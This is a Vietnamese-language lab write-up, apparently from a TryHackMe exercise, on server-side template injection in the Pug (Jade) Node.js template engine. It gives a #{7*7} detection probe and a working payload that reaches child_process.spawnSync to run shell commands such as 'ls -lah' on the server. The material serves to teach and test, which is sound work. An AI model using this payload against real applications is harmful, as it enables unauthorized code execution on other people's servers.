Pug (trước đây gọi là Jade) là một công cụ tạo mẫu hiệu năng cao được sử dụng rộng rãi trong cộng đồng Node.js nhờ khả năng hiển thị HTML ngắn gọn và các tính năng nâng cao như điều kiện, vòng lặp và kế thừa mẫu. Mặc dù Pug cung cấp các công cụ mạnh mẽ cho các nhà phát triển, khả năng thực thi mã JavaScript trực tiếp trong các mẫu có thể tiềm ẩn những rủi ro bảo mật đáng kể.

Các lỗ hổng bảo mật của Pug chủ yếu xuất phát từ khả năng chèn mã JavaScript vào các biến mẫu. Tính năng này, được thiết kế để tạo nội dung động, có thể bị khai thác một cách độc hại nếu dữ liệu đầu vào của người dùng được nhúng vào mẫu mà không được xử lý đúng cách.

Các nhà phát triển phải cẩn thận làm sạch và xác thực dữ liệu đầu vào của người dùng để giảm thiểu những rủi ro này và đảm bảo an ninh cho các ứng dụng sử dụng Pug.

Các điểm dễ bị tổn thương chính:

1. Nội suy JavaScript : Pug cho phép nhúng JavaScript được sử dụng trực tiếp trong các mẫu bằng cách sử dụng dấu ngoặc nhọn nội suy `#{}`. Nếu dữ liệu đầu vào của người dùng được nội suy mà không được xử lý đúng cách, nó có thể dẫn đến việc thực thi mã tùy ý.
2. Thoát ký tự mặc định : Pug cung cấp tính năng thoát ký tự tự động cho một số đầu vào nhất định, chuyển đổi các ký tự như  `<`, `>` và `&` thành các thực thể HTML tương ứng để ngăn chặn các cuộc tấn công XSS. Tuy nhiên, hành vi mặc định này không bao gồm tất cả các vấn đề bảo mật tiềm ẩn, đặc biệt là khi xử lý nội suy không được thoát `!{}` hoặc các kịch bản đầu vào phức tạp

Exploitation 

Trước khi tạo payload, điều quan trọng là phải xác nhận xem ứng dụng đó có thực sự sử dụng Pug hay không. Ví dụ, hãy truy cập http://ssti.thm:8001/jade/(mở trong tab mới).

Chèn một cú pháp Pug cơ bản để kiểm tra quá trình xử lý mẫu, ví dụ như `<template> #{7*7}`. Nếu ứng dụng xuất ra 49, điều đó xác nhận rằng Pug đang xử lý mẫu.

<img width="2398" height="750" alt="image" src="https://github.com/user-attachments/assets/ff244f0e-c3e0-47ba-9242-d6c2ae46b8b2" />

Vì Pug cho phép nội suy JavaScript, nên chúng ta có thể sử dụng payload.`#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`

Đoạn mã độc trên sử dụng các mô-đun cốt lõi của Node.js để thực thi các lệnh hệ thống. Dưới đây là chi tiết:

1. `root.process` Truy cập đối tượng toàn cục processtừ Node.js bên trong mẫu Pug.
2. `mainModule.require('child_process')` Việc yêu cầu mô-đun này được thực hiện một cách động child_process, bỏ qua các hạn chế tiềm tàng có thể ngăn cản việc đưa nó vào một cách thông thường.
3. `spawnSync('ls')`: Thực thi lslệnh một cách đồng bộ.
4. `.stdout`: Ghi lại đầu ra chuẩn của lệnh, bao gồm cả danh sách thư mục.

<img width="2426" height="786" alt="image" src="https://github.com/user-attachments/assets/c6a67d76-0214-49fe-8286-17d26c0a1613" />

Vì sao spawnSync('ls -lah') có thể không hoạt động

Khi bạn cố gắng sử dụng `spawnSync('ls -lah')`, bạn đang cố gắng truyền toàn bộ lệnh và các đối số của nó dưới dạng một chuỗi duy nhất. Điều này không hoạt động như mong đợi vì spawnSync không tự động tách một chuỗi thành lệnh và các đối số của nó. Thay vào đó, nó coi toàn bộ chuỗi là lệnh cần thực thi, nhưng nó không thể tìm thấy lệnh đó và do đó không thể thực thi.

Hành vi này rất quan trọng để ngăn chặn một số loại lỗ hổng bảo mật, chẳng hạn như tấn công chèn lệnh, trong đó kẻ tấn công có thể cố gắng thêm các lệnh hoặc đối số bổ sung để thực hiện các hành động không mong muốn.

Hiểu cách sử dụng spawnSync

Chức năng này spawnSyncđược thiết kế để thực thi một lệnh trong shell và cung cấp khả năng kiểm soát chi tiết đối với đầu vào và đầu ra của lệnh. Nó là một phần của `child_process` mô-đun của Node.js, cho phép Node.js thực thi các tiến trình khác trên hệ thống nơi nó đang chạy.

Chữ ký hàm cho spawnSync là:

`spawnSync(command, [args], [options])`

1. command : Đây là một chuỗi ký tự chỉ định lệnh cần thực thi.
2. args : Đây là một mảng các đối số chuỗi để truyền cho lệnh.
3. options : Đây là tham số tùy chọn có thể chỉ định nhiều tùy chọn khác nhau như thư mục làm việc, biến môi trường, đầu vào, đầu ra, thời gian chờ, v.v.

Cách sử dụng đúng hàm spawnSync

spawnSyncĐể sử dụng `ls` lệnh có đối số một cách chính xác `-lah`, bạn cần tách lệnh và các đối số của nó thành hai phần riêng biệt:

```
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```

Ở dạng đã được sửa đổi này:

1. `'ls'` là lệnh.
2. `['-lah']` là một mảng chứa tất cả các đối số được truyền cho lệnh.
Cấu trúc này đảm bảo rằng `ls` lệnh được gọi với `-lah` đối số phù hợp, cho phép lệnh hoạt động như dự định. Vì vậy, tải trọng cuối cùng sẽ là `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`

<img width="2386" height="876" alt="image" src="https://github.com/user-attachments/assets/96cc676c-af6c-490b-907b-996c73fc6aa8" />
